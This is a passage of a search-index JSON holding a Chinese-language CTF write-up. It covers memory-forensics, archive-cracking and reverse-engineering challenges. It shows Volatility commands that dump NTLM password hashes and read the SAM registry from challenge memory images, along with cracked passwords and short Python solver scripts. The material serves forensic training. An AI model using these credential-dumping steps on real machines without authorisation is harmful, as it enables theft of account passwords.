\u6210\u529f\u62ff\u5230flag","title":"\u989c\u6587\u5b57\u4e4b\u8c1c"},{"location":"%E5%8F%91%E8%B4%A2writeup/#passwd","text":"\u662f\u4e00\u9053\u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u53bb\u62ff\u5230\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801 python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02::: \u6709\u4e2a\u53eb\u505aCTF\u7684\u8d26\u53f7\uff0c\u4f30\u8ba1\u5c31\u662f\u5f53\u524d\u7528\u6237\u4e86 CTF\u5bc6\u7801ntlm\u67e5\u8be2\u51fa\u6765\u662fqwer1234\uff0c\u7136\u540eMD5\u5c31\u662fflag","title":"passwd"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_4","text":"\u770b\u4e0a\u53bb\u662f\u660e\u6587\u653b\u51fb\uff0c\u4f46\u662fflag.txt\u662f\u5f3a\u52a0\u5bc6\u7684\uff0c\u4f30\u8ba1\u660e\u6587\u653b\u51fb\u65e0\u6548 \u5e72\u8106\u5b57\u5178\u7206\u51fa\u538b\u7f29\u5305\u5bc6\u7801 123%asd!O \u7136\u540e\u6805\u680f\u5bc6\u7801\u89e3\u7801\u5f97\u5230flag","title":"\u865a\u5b9e\u4e4b\u95f4"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_5","text":"\u67e5\u770b\u8fdb\u7a0b\uff0c\u53d1\u73b0notepad.exe\uff0cpid\u4e3a2440\uff0c\u4e0d\u8fc7\u5185\u5bb9\u662f\u4e71\u7801\u7684\uff0c\u4f30\u8ba1\u5b58\u5728\u7f16\u7801\u95ee\u9898\uff0c\u90a3\u6211\u4eec\u5e72\u8106\u628a\u8fdb\u7a0b\u5bfc\u51fa python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb \u7528diskgenius\u6253\u5f00\u5bfc\u51fa\u7684dmp\u6587\u4ef6\u53ef\u4ee5\u770b\u5230 python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" \u4e8e\u662f\u5bfc\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6279\u91cf\u89e3NTLM\uff0c\u6700\u540e\u5c1d\u8bd5\u5bc6\u7801\u4e3a NIAIWOMA \u7684\u8d26\u6237\u548c\u5bc6\u7801MD5 \u662fflag \u518d\u770b\u4e00\u4e0b\u65e5\u5fd7 python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner > ./my_mem/out/hxb \u53d1\u73b0\u8fd9\u4e2a\u7535\u8111\u6743\u9650\u90fd\u662f\u5199\u5728\u7528\u6237\u7ec4\u91cc\u9762\u7684\uff0c\u5e38\u89c4\u7528\u6237\u5e94\u8be5\u90fd\u662f S-1-5-18 \u8fd9\u4e2a\u7528\u6237\u7ec4\u7684 \u4f46\u662f\u770b\u4e0d\u5230\u5177\u4f53\u662f\u54ea\u4e9b\u7528\u6237\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u662f\u6211\u592a\u83dc\u4e86 \u590d\u73b0\u7684\u65f6\u5019\u53d1\u73b0 SAM\\Domains\\Account\\Users\\Names \u8fd9\u4e2a\u6ce8\u518c\u8868\u76ee\u5f55\u4e0b\u5b58\u5728\u6240\u6709\u7528\u6237\uff0c\u67e5\u770b\u7528\u6237\u7684\u952e\u503c\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u6ce8\u518c\u8868\u6700\u540e\u4fee\u6539\u7684\u65f6\u95f4 \u67e5\u770b\u51e0\u4e2a\u7528\u6237\uff0c\u53d1\u73b0\u4ed6\u4eec\u7684\u4fee\u6539\u65f6\u95f4\u90fd\u5728 14:02 \u8fd9\u4e2a\u65f6\u95f4 \u800c\u6574\u4e2a\u8868\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u662f\u5728 14:07 \u4e4b\u540e\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u628a 14:07 \u4fee\u6539\u6ce8\u518c\u8868\u7684\u7528\u6237\u627e\u51fa\u6765\u5c31\u884c\u4e86\uff0c\u6413\u4e2a\u811a\u672c # coding=utf-8 import os hide_mem = \"../my_mem/hide.vmem\" payload = 'python ../vol.py -f ../my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K \"SAM\\\\Domains\\\\Account\\\\Users\\\\Names\\\\{}\"' # print(payload) # list = os.system(\"ls ../my_mem/\") user_list = open(\"./user_list.txt\", \"r\").read().split() # print(user_list) # test = os.system(payload.format(user_list[0])) # print(payload.format(user_list[0])) # print(type(\"14:02:09\")) for i in user_list: test = os.popen(payload.format(i)).readlines() output = \"\".join(test) # print(output) if \"14:02:09\" not in output: print(i) \u6587\u4ef6\u8def\u5f84\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u8fdb\u884c\u4fee\u6539 \u5341\u51e0\u5206\u949f\u5927\u6982\u53ef\u4ee5\u51fa\u6765","title":"\u9690\u85cf\u7684\u79d8\u5bc6"},{"location":"%E5%8F%91%E8%B4%A2writeup/#re","text":"","title":"RE"},{"location":"%E5%8F%91%E8%B4%A2writeup/#easy_c","text":"\u7b80\u5355\u5f02\u6216\u76f4\u63a5\u811a\u672c\u8dd1 a=\"7d21e<e3<:3;9;ji t r#w\\\"$*{*+*$|,\" b=\"\" for i in range(len(a)): b+=chr(ord(a[i])^i) print(b)","title":"easy_c++"},{"location":"%E5%8F%91%E8%B4%A2writeup/#easyre","text":"\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u4f4d\u4e00\u4f4d\u7206\u51fa\u6765","title":"easyre"},{"location":"%E5%8F%91%E8%B4%A2writeup/#reme","text":"import hashlib list = [ 'e5438e78ec1de10a2693f9cffb930d23', '08e8e8855af8ea652df54845d21b9d67', 'a905095f0d801abd5865d649a646b397', 'bac8510b0902185146c838cdf8ead8e0', 'f26f009a6dc171e0ca7a4a770fecd326', 'cffd0b9d37e7187483dc8dd19f4a8fa8', '4cb467175ab6763a9867b9ed694a2780', '8e50684ac9ef90dfdc6b2e75f2e23741', 'cffd0b9d37e7187483dc8dd19f4a8fa8', 'fd311e9877c3db59027597352999e91f', '49733de19d912d4ad559736b1ae418a7', '7fb523b42413495cc4e610456d1f1c84', '8e50684ac9ef90dfdc6b2e75f2e23741', 'acb465dc618e6754de2193bf0410aafe', 'bc52c927138231e29e0b05419e741902', '515b7eceeb8f22b53575afec4123e878', '451660d67c64da6de6fadc66079e1d8a', '8e50684ac9ef90dfdc6b2e75f2e23741', 'fe86104ce1853cb140b7ec0412d93837', 'acb465dc618e6754de2193bf0410aafe', 'c2bab7ea31577b955e2c2cac680fb2f4', '8e50684ac9ef90dfdc6b2e75f2e23741', 'f077b3a47c09b44d7077877a5aff3699', '620741f57e7fafe43216d6aa51666f1d', '9e3b206e50925792c3234036de6a25ab', '49733de19d912d4ad559736b1ae418a7', '874992ac91866ce1430687aa9f7121fc' ] def decode(n): result = [] while n != 1: if n%2: n=n*3+1 else: n=n//2 result.append(n) return result if __name__ == \"__main__\": for i in range(33,128): result = decode(i) string = '' for x in range(len(result)): string += str(result[x]) string += str(result[(len(result) - x - 1)]) md5 = hashlib.md5() md5.update(string.encode()) md5 = md5.hexdigest() for line in range(27): if md5 == list[line]: print line,'->',chr(i) \u7136\u540e\u6309\u987a\u5e8f\u6392\u5e8fMD5\u5373\u53ef","title":"ReMe"}]}